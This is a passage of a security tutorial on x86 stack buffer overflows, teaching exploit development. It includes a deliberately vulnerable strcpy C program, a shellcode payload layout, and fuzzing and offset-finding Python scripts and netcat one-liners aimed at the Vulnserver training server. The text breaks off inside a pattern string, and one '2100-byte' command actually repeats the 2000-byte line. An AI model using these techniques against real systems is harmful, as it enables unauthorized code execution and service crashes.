---
title:  "Buffer Overflow 101 (x86)"
imgdir: x86-buffer-overflow-basics
date: 2021-12-11
excerpt: An theory behind stack based x86 buffer overflows and how to find and exploit them
tocmax: 2
tags: buffer-overflow

---

This article outlines the theory behind x86 stack buffer overflows as well as covering discovery and exploit development methods.

A video series covering the same content can be found [here](https://www.youtube.com/playlist?list=PLdVIvW2RPTRxNdJeBZRcdt1JQJlmQlQMU). Individual videos are included in each section.


# x86 Memory Fundamentals

{% include video id="_D8eLCmlrS8" provider="youtube" %}

## Architecture 

There are several different [Instruction Set Architectures](https://en.wikipedia.org/wiki/Instruction_set_architecture)(ISA) and implementations. Fundamentally, the ISA defines how the software interfaces with the hardware by specifying the available instructions, the data types, feature set, core memory management as well as other key criteria required for interacting with the CPU. The two most common ISAs are ARM and x86. One of the key differences between these architectures is that x86 is part of the Complex Instruction Set Computing (CISC) family, whereas ARM is part of the Reduced Instruction Set Computing (RISC) family. As the names imply, CISC contains more complex instructions than RISC, essentially shifting some of the legwork from the compiler and compiled code over to the CPU. x86 based processors are common place in end user computing systems such as Desktops and Laptops, as well as Servers. ARM based chips are commonly found in mobile devices, embedded systems and IoT devices - however ARM usage is spreading in the end user computing space, [particularly with Apple shifting to their own M1 ARM based silicon in 2020](https://www.apple.com/uk/newsroom/2020/11/apple-unleashes-m1/).

We're going to focus on the x86 architecture and how memory is managed.

## CPU Registers

Registers are locations in the CPUs memory that are directly accessible by the processor to store values and instructions required for the current operation. The x86 architecture has 8 General purpose registers, 6 Segment registers, 1 Flag register and an Instruction pointer. There are also some additional registers in x86-64.

### General Purpose Registers

{% include post-image name="cpu-registers.png" %}

- **Accumulator:** Used in arithmetic operations 
- **Counter:** Used in loops and shift/rotate instructions
- **Data:** Used in arithmetic operations and I/O operations
- **Base:** Used as a pointer to data
- **Stack Pointer:** Points to top of stack
- **Stack Base Pointer:** Points to base of stack
- **Source:** Points to source in stream operations
- **Destination:** Points to destination in stream operations

The Stack Pointer (ESP) and Stack Base Pointer (EBP) are particulary relevant for this article.

### Segment Registers

The 6 segment registers reference the memory locations of the various segments of memory.
<details>
  <summary>Click here for details on the Segment registers.</summary>
  - CS: Code Segment <br>
  - DS: Data Segment <br>
  - SS: Stack Segment <br>
  - ES: Extra Segment <br>
  - FS: General Purpose Segment <br>
  - GS: General Purpose Segment <br>
</details>
<br>
x86-64 Systems, however utilise [paging](https://en.wikipedia.org/wiki/Memory_paging) instead of [segmentation](https://en.wikipedia.org/wiki/Memory_segmentation) and so the purposes of these registers are no longer as originally intended with the first four segments being set to a 0 base.

### Flag Register

x86 utilises the EFLAGS register which is 32-bits wide, and x86-64 uses the RFLAGS register which is 64-bits wide. 
<details>
  <summary>Click here for details on the Flag registers.</summary>
  - CF: Carry Flag - Set when an arithmetic carry or borrow a bit beyond the register size. <br>
  - PF: Parity Flag - Set when the sub of bits in least significant bytes is even. <br>
  - AF: Adjust Flag - Similar to Carry flag - to support binary-coded decimal arithmetic. <br>
  - ZF: Zero Flag - Set if arithmetic result is zero. <br>
  - SF: Sign Flag - Set if arithmetic result is negative. <br>
  - TF: Trap Flag - Set if single-step debugging is enabled. <br>
  - IF: Interruption Flag - Sets if CPU will respond to maskable hardware interrupts. <br>
  - DF: Direction Flag - Sets processing direction of strings. <br>
  - OF: Overflow Flag - Set if arithmetic overflow occurs in operation. <br>
  - IOPL: (2-bits) I/O Pivilege Level flag - Shows I/O privilege level of current process. <br>
  - NT: Nested Task Flag - Set if current process is linked to next process for interrupt chaining. <br>
  - RF: Resume Flag - Set to ignore debug faults on next instruction when debugging. <br>
  - VM: Virtual-8087 Mode flag - Set if in 8086 compatibility mode. <br>
  - AC: Alignment Check flag - If set to 1, throw exception on misaligned data access from memory. <br>
  - VIF: Virtual Interrupt Flag. <br>
  - VIP: Virtual Interrupt Pending flag. <br>
  - ID: Identification flag. <br>

The remainder of the bits are reserved on both x86 and x86-64 systems.
</details>

### Instruction Pointer

The Extended Instruction Pointer (EIP) contains the address of the next instruction to be executed. This is particularly interesting for the context of exploitation.

## Memory Structure 

We need a basic understanding of how program memory is structured. For a Linux based system, the program memory could be represented as follows (Windows is structured in a similar manner):

{% include post-image name="memory-structure.png" %}{:style="width:50%"}

- **Text Segment:** Process binary image
- **Data Segment:** Initialised global & static variables
- **BSS Segment:** Uninitialised global & static variables
- **Heap:** Dynamically allocated variables
- **Memory Mapping Segment:** File mappings including dynamic libraries
- **Stack:** Local variables and parameters for each thread
- **Kernel Space:** Reserved for kernel functionality. This space is not accessible from the user space that all of the above operates within.

For the context of this article, we will focus specifically on the Stack.

## The Stack & Stack Frames

As indicated above, the stack is a space of memory that serves as a temporary storage location for each individual thread. Each thread has its own dedicated memory stack. The memory stack works on a Last-In-First-Out (LIFO) basis, by which the last element stored on the top of the stack (`PUSH`ed) is the first element removed (`POP`ed). An easy way of visualising this is as a stack of clean plates in a restaurant - the top plate is the last placed on top of the stack, and is the first removed.

{% include post-image name="LIFO.png" %}{:style="width:80%"}

The stack is composed of one or more stack frames, each of which correspond to an unterminated function or procedure call. These frames contain the function/procedure call's parameters, local variables, a return address as well as a copy of the address in the Stack Base Pointer (EBP) from when the function/procedure was called.

{% include post-image name="stack-structure.png" %}{:style="width:80%"}

The EBP allows for the variables and parameters in the stack to be referenced as an offset from the EBP address.

As indicated above, the stack will contain a procedure's frame, as well as the frames of calling procedures. Once a procedure is terminated, its frame is removed from the stack with its stored EBP `POP`ed into the EBP and the return address `POP`ed into the EIP.

## Example Program

Let's take a look at a practical example so that this makes a bit more sense.

{% highlight c linenos%}
#include <stdlib.h>

void main()
{

  char main_var[] = "hello";      //declare variable of "hello"
  sub1_proc("world");             //call sub1_proc with "world" 
}

void sub1_proc(char *sub1_param)
{
  char sub1_var[] = "how";        //declare variable of "how"
  sub2_proc("are");               //call sub2_proc with "are" 
}

void sub2_proc(char *sub2_param)
{
  char sub2_var[] = "you";        //declare variable of "you"
}

{% endhighlight %}

We can work line by line through this and view whats going on in the stack with a debugger, starting from the main function being called. 

We can see the return address and stored EBP being `PUSH`ed to the stack, there are no parameters here and no variables have yet been defined.

{% include post-image name="stack-main-entry.png" %}{:style="width:60%"}
Debugger:
{% include post-image name="stack-main-entry-dbg.png" %}{:style="width:80%; display:inline-block"}
{% include post-image name="stack-main-entry-reg-dbg.png" %}{:style="width:15%; display:inline-block"}


We then define the main_var variable with `char main_var[] = "hello";`{:.language-c .highlight}. We can see this value being pushed to the stack, with the stack expanding into lower addresses.

{% include post-image name="stack-main-var.png" %}{:style="width:70%"}
Debugger:
{% include post-image name="stack-main-var-dbg.png" %}{:style="width:80%"}

The next step in the main procedure is to call `sub1_proc` with "world" as a parameter. When calling this, we can see our new frame being pushed onto the top of the stack with its return address, stored EBP and our only parameter `sub1_param` being passed as "world" as expected. Note that the main function frame is still within the stack as it has not yet terminated - its waiting on a return from the procedure that we've just called.

{% include post-image name="stack-sub1-entry.png" %}{:style="width:70%"}
Debugger:
{% include post-image name="stack-sub1-entry-dbg.png" %}{:style="width:80%; display:inline-block"}
{% include post-image name="stack-sub1-entry-reg-dbg.png" %}{:style="width:15%; display:inline-block"}

Within this procedure, we then set a new variable with `char sub1_var[] = "how";`{:.language-c .highlight} which then gets pushed onto the stack.

{% include post-image name="stack-sub1-var.png" %}{:style="width:70%"}
Debugger:
{% include post-image name="stack-sub1-var-dbg.png" %}{:style="width:80%"}

From here we call `sub2_proc` with "are" as a parameter. We can see the new frame being pushed to the stack with `sub2_param` being passed along with the stored EBP and return address as expected.

{% include post-image name="stack-sub2-entry.png" %}{:style="width:70%"}
Debugger:
{% include post-image name="stack-sub2-entry-dbg.png" %}{:style="width:80%; display:inline-block"}
{% include post-image name="stack-sub2-entry-reg-dbg.png" %}{:style="width:15%; display:inline-block"}

**Note:** the debugger hasn't decoded the value of the parameter in this view but we can confirm that the referenced memory address contains "are" (`61 72 65` is hex for "are").

{% include post-image name="stack-sub2-entry-param-dbg.png" %}{:style="width:80%"}

We then set a new variable with `char sub2_var[] = "you";`{:.language-c .highlight} which is pushed onto the stack.

{% include post-image name="stack-sub2-var.png" %}{:style="width:70%"}
Debugger:
{% include post-image name="stack-sub2-var-dbg.png" %}{:style="width:80%"}

Now that `sub2_proc` has completed, execution needs to return to its parent procedure and so its frame will be popped off the stack with the stored EBP being restored and Return address `POP`ed to the EIP.

{% include post-image name="stack-sub2-pop.png" %}{:style="width:70%"}
Debugger:
{% include post-image name="stack-sub2-pop-dbg.png" %}{:style="width:80%"}

We're now back in the frame of `sub1_proc` which has also now completed, and execution returns to the main procedure with its frame popped off the stack with the Stored EBP being `POP`ed into the EBP and the return address `POP`ed into the EIP. 

{% include post-image name="stack-sub1-pop.png" %}{:style="width:70%"}
Debugger:
{% include post-image name="stack-sub1-pop-dbg.png" %}{:style="width:80%"}

We're now back to main which has nothing else left to do and so repeats the same process. 

# Buffer Overflow Demo

{% include video id="hH0Pss7PGVE" provider="youtube" %}

Now that we have a working understanding of how the stack operates, we can focus on how we can exploit this. When a variable is declared within a function, some buffer space is allocated on the stack of a set size - this size has either been hard coded into the program, or calculated at time of compiling. If we assign a value to this variable that fits within this allocated buffer - then it will be stored there in the stack and everything should work normally. However, if we're able to assign a value to that variable that exceeds the allocated buffer size, we may be able to fill the allocated space, before overflowing over other areas of memory such as other variables and parameters, the stored EBP and the return address.

{% include post-image name="overflow-var.png" %}{:style="width:80%"}

The return address is particularly of note here, as we know it gets `POP`ed into the EIP on function completion and thus executes the flow of execution.

Again, let's get an example to run through.

{% highlight c linenos%}
#include <stdio.h>
#include <string.h>

void main(int argc, char *argv[]){
  copyit(argv[1]);                  // call copyit function with program argument
}

int copyit(char *source_str) {
  char buffer[128];                 // declare buffer of 128 bytes
  strcpy(buffer,source_str);        // call strcpy function to copy parameter into buffer
}
{% endhighlight %}

We have switched to `gdb` as debugger from this point onwards (edb was used to help visually display the stack).
{:.notice--info}

In line 9 within the `copyit` function, we're declaring a 128 byte buffer and on the next line, we then copy the program argument into this newly created buffer. If we run our code with 128 * `A` as an argument, we can observe them being copied into our declared variable buffer once `strcpy` has run.

{% include post-image name="overflow-strcpy-clean.png" %}{:style="width:90%"}

Now, things get a bit interesting here. There is nothing in place restricting us from passing a larger source string to `strcpy` than will fit in the buffer. Reviewing the above screenshots, we can see that there's 12 bytes between the end of our 128 * `A` and the return address. Let's add 12 * `B` to our string to reach the return address, and 4 * `C` matching the return address size and rerun our program.

{% include post-image name="overflow-strcpy-dirty.png" %}{:style="width:80%"}

We can see here that the 128 byte allocated buffer is completely filled with `41` representing the `A`s in our payload, this is followed by 12 bytes of `42` representing the `B` that we sent. Note that the final 4 bytes of `B` are written into the address that the `EBP` is pointing to, this means that the following 4 bytes repesent the return address. This return address has been overwritten with 4 bytes of `43` which represents the `C`s that we sent - as this then gets loaded into the EIP, we get a segmentation fault as `0x43434343` is not a valid accessible memory address.

{% include post-image name="overflow-var-overflow.png" %}{:style="width:40%"}

We've successfully overwritten the return address with an abitrary value. At the moment, we can only crash the target - but there's a lot more possible.

We've got around 140 bytes that we can write to the stack and the ability to overwrite the return address, and therefor the EIP, to point to an arbitrary address. Reviewing the above memory stack images, we can see that our buffer starts at `0xffffd110` (note: this is consistent between runs due to disabled memory protections and tests run concurrently on the same system). This means that if we can swap our 128 * `A` for a payload, and point the EIP to the start of this buffer, we can then execute arbitrary code. 

There's a few components we need to string together for our payload now:
- **nop-sled:** A set of No Operation, or nop, bytes at the start of the payload. When the CPU encounters these instructions, it simply moves onto the next instruction. This allows for some space for our payload to unpack. nop is represented by the hex of `\x90`. 16 bytes of this should be sufficient.
- **Payload:** We need the code that we want executed, for this exercise - we'll create a simple payload with [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom) that will create a file called `confirmed`.
- **Buffer Filler:** We need to ensure our payload is the correct size to verflow the buffer and overwrite the return address. We'll caculate the size of this by taking the payload size and the nop sled size away from the 140 bytes required to overwrite the return address.
- **Return Address:** We can set this to `0xffffd110` - the address of the start of our payload in memory. As the target is [little endian](https://en.wikipedia.org/wiki/Endianness) we will need to format this as `\x10\xd1\xff\xff`. 

So to summarise that, our payload should be something along the lines of:<br>
`(16 * '\x90') + payload + ((140 - 16 - length(payload)) * 'A') + '\x10\xd1\xff\xff'`<br>

Let's build this together into a file.

{% include post-image name="overflow-strcpy-shell-payload.png" %}{:style="width:90%"}

We can now load this file in our program using `$(cat overflow_payload)` as the argument.

{% include post-image name="overflow-strcpy-shell-exec.png" %}{:style="width:90%"}

Here we can see our payload and relevant padding etc as expected, with the return address pointing to the start of our buffer. Allowing the code execution to continue, our msfvenom payload is executed and our `confirmed` file is created.

{% include post-image name="overflow-strcpy-shell-proof.png" %}{:style="width:40%"}

Great, we successfully overflowed the buffer on the target application to overwrite the return address and execute arbitrary code. 


# The Target

From this point on we'll work on discovering and exploiting a buffer overflow vulnerability on [Vulnserver](https://github.com/stephenbradshaw/vulnserver). Vulnserver is Windows based TCP server program for security researchers to learn and develop skills. The executable and DLL have been downloaded from this repository - starting Vulnserver is as easy as running the executable (ensure the dll is in the same folder).

Based on the documentation, Vulnserver listens on port 9999 by default. Connecting to the target with netcat from our kali machine allows us to interact with it. We'll use `-n` to disable name resolution and `-v` for increased verbosity, and specify the IP and port of the target. 

`nc -nv 10.128.200.96 9999`

{% include post-image name="vulnserver-welcome.png" %}{:style="width:50%"}

Connecting displays the banner on the target, and entering `HELP` as prompted provides a list of available commands.

{% include post-image name="vulnserver-help.png" %}{:style="width:50%"}

Looking at the `TRUN` command, we can see it requires `TRUN ` and then the argument. Running `TRUN` with a random string, we get a `TRUN` Complete response. 

{% include post-image name="vulnserver-trun.png" %}{:style="width:20%"}

This same process can be scaled to test multiple commands and variants during the fuzzing process - but for simplicity sake, we’ll just focus on `TRUN`.

# Fuzzing

{% include video id="rhpxaBF8n78" provider="youtube" %}

Fuzzing is common in various security testing scenarios and is the idea of sending lots different payloads, including malformed requests - to see how they impact behaviour on the target. This can be automatically generated payloads - or you could use a wordlist to work from.

We can bring this concept into the context of our buffer overflow to help us get started with developing our exploit. The main idea that we’re working with here is trying to understand what payload is required to overflow the buffer, including being large enough to actually overflow the allocated buffer space as well as being formed in a way that bypasses or satisfies any input validation.

## Fuzzing with SPIKE

To determine if the `TRUN` command is vulnerable, we’ll use part of a fuzzing tool creation suite called [SPIKE](https://www.kali.org/tools/spike/) which is preinstalled in Kali. In particular, we’ll use `generic_send_tcp`. This tool will fuzz a tcp target with automatically generated payloads, including various characters that may be required for bypassing or satisfying any input validation.

{% include post-image name="fuzzing/spike-syntax.png" %}{:style="width:70%"}

Checking the command usage - we can see that a few arguments are required. First, we’ve got the target host and port. Next we can see a `spike_script` is required. Here's an example script that we'll use:

{% highlight c linenos%}
s_readline();
s_string("TRUN ");
s_string_variable("x");
{% endhighlight %}

Working our way through the script. Line 1 is running a readline to receive the Welcome banner sent by Vulnserver. Line 2 then sends `TRUN ` as a string, which we want included in every fuzz attempt. Below this, in Line 3, we set a variable string, which will be replaced by a payload generated by `generic_send_tcp`. The string of `"x"` that we've entered here will be sent as the value during the first fuzz, and will also be set as the value if there are multiple string variables within the script - as we've only got the one string variable in our script, the value of this is fairly irrelevant.

So this script will run read from the tcp connection, then send `TRUN` with our generated payload appended. Before moving onto the next payload and repeating.

The final two arguments for `generic_send_tcp` are `SKIPVAR` and `SKIPSTR`. `SKIPVAR` is relevant if we have multiple variables defined in our script and allows us to skip fuzzing a certain variable. `SKIPSTR` will allow us to start a variables fuzzing from a certain point within the payload generation process. These will allow us to easy resume fuzzing from a certain point if needed but for now, we can set them both to 0.

This gives us a command of: `generic_send_tcp 10.128.200.96 9999 trun.spk 0 0`

{% include post-image name="fuzzing/generic-tcp-send-1.png" %}{:style="width:70%"}

Running this causes Vulnserver to crash after a couple of seconds. 

Now, we need to see what request actually caused the crash. There are a few approaches for this. We'll use [ngrep](https://github.com/jpr5/ngrep) to capture the network packets for this.

We'll run it using: `sudo ngrep -d eth0 -q '' 'dst 10.128.200.96'`

{% include post-image name="fuzzing/ngrep-command.png" %}{:style="width:70%"}

With `-d` specifying the interface that we want to listen on. `-q` as we only want to print the packet data. We include blank quotes `''` for the positional parameter for a sting to grep for - we want to return all results hence they're blank. We've filtered down to only the packets sent to the destination IP.

A slight change is needed to the spike scipt to include a short sleep between payload sends to allow us to easily identify which one causes the crash.

{% highlight c linenos%}
s_readline();
s_string("TRUN ");
s_string_variable("x");
sleep(5);
{% endhighlight %}

Now that we've got an updated spike script, and ngrep listening for packets, we can restart Vulnserver, then run `generic_send_tcp` again with:

`generic_send_tcp 10.128.200.96 9999 trun.spk 0 0`

{% include post-image name="fuzzing/generic-tcp-send-2.png" %}{:style="width:70%"}

Vulnserver crashes after a few seconds, and we can see that ngrep has collected some data.

{% include post-image name="fuzzing/ngrep-results.png" %}{:style="width:70%"}

Reviewing the ngrep output, we can see the first payload of `TRUN x` was sent. Following this, we can see that `TRUN AAAAAAAAAA...` was sent, with the `A`s continuing on. On viewing the next few packets, we can see that they don't start with `TRUN` - this is due to the [Maximum Transmission Units (MTUs)](https://en.wikipedia.org/wiki/Maximum_transmission_unit) meaning we're limited to 1460 bytes of data per payload. We can also see that the packets that end each request include the `PSH` flag. Adding up the packets making up this payload, we've got 1460 * 3 plus 6/700 so roughly 5000 `A`s.

{% include post-image name="fuzzing/ngrep-results2.png" %}{:style="width:50%"}

We can see that this is the final payload. Dependant on whether a sufficient timeout is set - you may see some other requests following the one causing the crash - dependant on if that payload was sent before the target crashes.

Now that we’ve got a payload that should crash the server. Let’s load up Vulnserver in a debugger so that we can get visibility into the registers and memory stack. There's a range of debuggers available in each platform:

Windows:
- [Immunity](https://www.immunityinc.com/products/debugger)
- [OllyDbg](https://www.ollydbg.de/)
- [WinDbg](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools)

Linux:
- [edb](https://github.com/eteran/edb-debugger)
- [GDB](https://www.sourceware.org/gdb/) 

macOS:
- [LLDB](https://lldb.llvm.org/)

We could even run the windows application on linux under wine and use one of the debuggers available there. The concepts here are applicable across these platforms assuming the architecture is x86.

For now, we’ll use Immunity. Bear in mind - that the debugger needs to be running in the same scope as the target application, for example if the target application is running as administrator - then our debugger needs to be running as administrator as well. 

Within Immunity, there are two ways that we can connect to our target application. Either attaching to an already running process or opening a new one.

{% include post-image name="fuzzing/immunity-menu.png" %}{:style="width:40%"}

Opening Vulnserver in Immunity presents us with the following. 

{% include post-image name="fuzzing/immunity-layout.png" %}{:style="width:100%"}

There are a few things going on in the screen here:
- Top left: Assembly code for the program, highlighting where we currently are.
- Top right: The CPU registers.
- Bottom left: Memory dump view in hex and ASCII.
- Bottom right: Memory stack view in Hex and ASCII.



You’ll notice that the bottom right status indicates the program is paused. It’s automatically paused at entry point within the debugger. Let’s resume it so that we can interact with Vulnserver. You can either click the play button, or press F9 to run.

We can validate that the payload determined from `generic_send_tcp` crashes the server by generating the string with python and piping it into netcat with:
`python3 -c 'print("TRUN /.:/" + "A" * 5000)'`

{% include post-image name="fuzzing/vulnserver-crash-kali.png" %}{:style="width:80%"}

{% include post-image name="fuzzing/vulnserver-crash-windows.png" %}{:style="width:100%"}

This has crashed Vulnserver as shown in the debugger, due to an access violation on executing `0x41414141`. Great - this lines up with what was happening in our buffer overflow demo. Taking a look at the registers, we can see that the EIP and EBP both contain `41414141` which is hex for `AAAA`.

Reviewing the stack - it appears to be completely filled with `A`s. What's presumably happened here, is our input string has been copied to a variable but has exceeded the allocated buffer space and so has overflowed and overwritten the stored EBP and return address, and so when the function ends, these are written to the EBP and EIP. The latter of which has caused our Access violation or segmentation fault as `41414141` is not a valid accessible memory address.

Through a bit of a trial and error, of seeing what’s required to cause this crash - we can determine that it’s just the `TRUN .` followed by the long string of `A`s.

{% include post-image name="fuzzing/vulnserver-crash-python.png" %}{:style="width:80%"}

Great - so we know that sending `TRUN .` and a long string of `A`s will crash the application, but we want to be able to do more than that. This generated payload was the first sent by `generic_send_tcp`, so there’s a high chance that it isn’t exactly 5000 bytes required to overflow the buffer and overwrite the return address. We need to get a general idea of how long this string needs to be in order to crash the target.

## Fuzzing with Python

We can use a simple fuzzing script to help us identify the buffer overflow. This wil send a payload with our prefix of `TRUN .` with an increasing number of `A`s appended.

{% highlight python linenos %}
#!/usr/bin/env python3

# Import a couple of modules: `socket` to support our TCP connection, `sys` for our application exit and `sleep` so that we can add a pause between each of our payload sends
import socket, sys
from time import sleep

# Set our target host and port
host = "10.128.200.96"
port = 9999 

# Setting our prefix of `TRUN .`
prefix = "TRUN ."

# Set our fuzz settings, with our character to use for the payload being `A`, our payload start size of `1500` bytes and our fuzz will step up in 100 byte increments.
fuzz_char = "A"
fuzz_length = 1500
fuzz_step = 100

# entering our `while True` and `try` statements, meaning that lines 23 - 41 will loop until an error is thrown.
while True:
  try:
    # Define our network socket, with `socket.AF_INET` representing IPV4 address family and `socket.SOCK_STREAM` as it's a TCP connection
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      # Set a timeout so the connection will end if the target is unreponsive (eg. when it has crashed and is being held by the debugger)
      s.settimeout(2)
      # Connect to the target
      s.connect((host, port))
      # Receive welcome banner
      s.recv(1024)
      # Build our payload consisting of `TRUN .` + `A` * 1500
      fuzz_payload = prefix + fuzz_char * fuzz_length
      # Print output to indicate current fuzz stage
      print(f"Fuzzing with {fuzz_length} bytes")
      # Send payload to target
      s.send(bytes(fuzz_payload, "latin-1"))
      # Recieve reponse from `TRUN` command
      s.recv(1024)
      # Sleep for 1 second
      sleep(1)
      # Increment the fuzz length by 100 bytes.
      fuzz_length += fuzz_step
  
  # Catch when target crashes 
  except:
    # Print out fuzz size at time of target crash
    print(f"Fuzzing crashed at {fuzz_length} bytes")
    sys.exit(0)
{% endhighlight %}


This will send a payload of `TRUN .` + 1500 * `A`, and then repeat, adding an additional 100 `A`s each time until the target crashes.

We'll bring up Immunity and restart Vulnserver from the menu or by pressing `ctrl + F2`, and then resume with `F9`.

We can now run our fuzzing script.

{% include post-image name="fuzzing/fuzzing-script-kali.png" %}{:style="width:60%"}

Fuzzing increments up with strings starting at 1500 bytes, until it ends at 2100 bytes. In Immunity, we can see that we’ve successfully overwritten the return address which has been written into the EIP. Overwriting it with `41414141` causing an access violation.

{% include post-image name="fuzzing/fuzzing-script-windows.png" %}{:style="width:100%"}

We can easily validate this by sending a payload of 2000 bytes with python:

`python3 -c 'print("TRUN ." + "A" * 2000)' | nc -nv 10.128.200.96 9999`

And this doesn't crash the target. However sending 2100 bytes does:

`python3 -c 'print("TRUN ." + "A" * 2000)' | nc -nv 10.128.200.96 9999`

So we know that we need to send a payload consisting of `TRUN .` and roughly 2100 additional bytes to overwrite the return address and crash the application.


# Controlling EIP

{% include video id="SajNnjeHOWI" provider="youtube" %}

Now that we can consistently crash the target by sending 2100 bytes of `A`. This is crashing the target due to the return address being overwritten with `41414141` which is then `POP`ed into the EIP. We now need to try and overwrite the return address with a specific value. To do this, we'll need to determine the offset between the start of our string of `A`s and the return address.

{% include post-image name="eip/offset-diagram.png" %}{:style="width:40%"}

One method we can use here, is sending a cyclical pattern to the target. A common method of building this payload is by starting with 3 characters sets, capital letters, lowercase letters and numbers with the pattern starting at `Aa0`. The number is incremented with the pattern repeated until it reaches 9 eg. `Aa0Aa1Aa2Aa3...`. Once the number reaches 9, the lowercase letter will increment up to b and then the process repeats eg. `Ab0Ab1Ab2Ab3...`. This repeats until the lowercase letter increments up to z at which point the uppercase letter increments to B eg. `Ba0Ba1Ba2Ba3...`. This process repeats giving use a maximum string length of 20280 characters where each 4 character string is unique. 

Why’s this important? When this is sent as our payload, the hex representation for these characters will be written to memory in the target, assuming the other buffer overflow conditions are met - the return address will be overwritten with some of our payload. By each 4 characters being unique with the string, that means that the value that is written to the EIP can be easily matched to a position in the payload. Therefore telling us the offset between the variable we’re writing to and the return address - which gives us the information we need to be able to control the EIP.

Now, whilst it would be fairly straight forward to generate this string ourselves, but there’s a pair of tools that are part of the metasploit framework that with help us here. `msf-pattern_create`, to generate the pattern and `msf-pattern_offset` to match a hex pattern to the generated string and identify its position or offset.

{% include post-image name="eip/msf-pattern-help.png" %}{:style="width:70%"}

Let’s create a pattern of 2100 bytes as we know that’s roughly what’s required to overwrite the EIP. We’ll run `msf-pattern_create -l 2100` to create the pattern. We can see it’s created us a pattern from `Aa0` to `Cr9`.

{% include post-image name="eip/msf-pattern-create.png" %}{:style="width:70%"}

Now we just need to send that to our target.

We'll use a python script for this, and we'll just adapt this script for the remainder of this article.

{% highlight python linenos %}
#!/usr/bin/env python3

# Import a couple of modules: `socket` to support our TCP connection and `sys` for our program
import socket, sys

# Set our target host and port
host = "10.128.200.96"
port = 9999

# Setting our prefix of `TRUN .`
prefix = "TRUN ."
# We've added in our pattern here that we generated with `msf-pattern_create` 
pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7C